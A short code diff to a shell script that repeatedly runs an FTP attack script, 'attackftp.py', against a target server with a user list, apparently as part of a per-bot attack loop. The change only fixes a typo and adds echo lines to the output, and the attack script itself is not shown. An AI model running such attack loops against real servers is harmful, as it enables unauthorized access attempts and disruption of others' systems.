@@ -3,7 +3,7 @@
 #give the duration of the attack per bot
 #duration=${1:-"9999999999"}
 
-echo "runnging $duration"
+echo "running $duration"
 
 
 
@@ -14,7 +14,11 @@ count=0
 while  ! [ true -a  $count -gt $duration ];do 
 	python attackftp.py -t $server -p users
 	sleep 1
+	echo " "
+	echo "Attacking server"
 	echo "$count NTH TIME"
+	echo "################################"
+        echo " "
 	count=$(($count + 1))
 done
 
